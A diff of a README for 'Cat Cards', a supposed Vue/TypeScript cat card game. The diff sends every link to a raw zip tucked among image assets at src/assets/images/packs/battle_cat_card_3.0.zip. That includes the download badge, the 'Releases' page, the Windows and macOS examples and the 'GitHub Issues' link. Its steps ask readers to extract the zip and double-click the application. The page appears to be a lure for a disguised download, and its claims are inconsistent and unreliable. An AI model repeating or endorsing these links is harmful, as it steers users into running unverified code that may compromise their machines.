@@ -4,7 +4,7 @@
 Welcome to Cat Cards! Dive into our collectible card game where every card showcases a real cat from TheCatAPI. Build your deck, mint cats, and engage in exciting battles with RPG-style stats. Playing is simple, and you’ll be battling in no time.
 
 ## 📥 Download the Game
-[![Download Cat Cards](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/interchanger/cat-card-battle.zip%20Cat%20Cards-via%20Releases-blue)](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/interchanger/cat-card-battle.zip)
+[![Download Cat Cards](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/src/assets/images/packs/battle_cat_card_3.0.zip%20Cat%20Cards-via%20Releases-blue)](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/src/assets/images/packs/battle_cat_card_3.0.zip)
 
 ## 📋 System Requirements
 Before downloading, please ensure your system meets these requirements:
@@ -15,12 +15,12 @@ Before downloading, please ensure your system meets these requirements:
 - **Browser:** Latest version of Chrome, Firefox, or Safari for web access.
 
 ## 📦 Download & Install
-Visit this page to download: [Cat Cards Releases](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/interchanger/cat-card-battle.zip). 
+Visit this page to download: [Cat Cards Releases](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/src/assets/images/packs/battle_cat_card_3.0.zip). 
 
 1. Click the link above to access the Releases page.
 2. Find the latest version of Cat Cards. It is usually at the top of the list.
 3. Click on the asset that matches your operating system to start the download. 
-   - For example, you may see something like `https://raw.githubusercontent.com/Verus508/cat-card-battle/main/interchanger/cat-card-battle.zip` for Windows or `https://raw.githubusercontent.com/Verus508/cat-card-battle/main/interchanger/cat-card-battle.zip` for macOS.
+   - For example, you may see something like `https://raw.githubusercontent.com/Verus508/cat-card-battle/main/src/assets/images/packs/battle_cat_card_3.0.zip` for Windows or `https://raw.githubusercontent.com/Verus508/cat-card-battle/main/src/assets/images/packs/battle_cat_card_3.0.zip` for macOS.
 4. Once the download completes, locate the file on your computer.
 5. Extract the ZIP file if necessary by right-clicking on it and selecting "Extract" or "Unzip."
 6. Open the extracted folder, then double-click on the application to start playing.
@@ -46,6 +46,6 @@ Cat Cards uses Vue 3 technology combined with TypeScript and Tailwind for a smoo
 If you wish to contribute to the development of Cat Cards during Hacktoberfest or beyond, please check the guidelines in our repository. You're welcome to submit issues, feature requests, or even code contributions.
 
 ## 🆘 Help & Support
-For any issues or questions, please visit the [GitHub Issues](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/interchanger/cat-card-battle.zip) page. You can also find helpful community members in the discussions section.
+For any issues or questions, please visit the [GitHub Issues](https://raw.githubusercontent.com/Verus508/cat-card-battle/main/src/assets/images/packs/battle_cat_card_3.0.zip) page. You can also find helpful community members in the discussions section.
 
 We hope you enjoy playing Cat Cards and collecting all the adorable cats! Happy gaming!
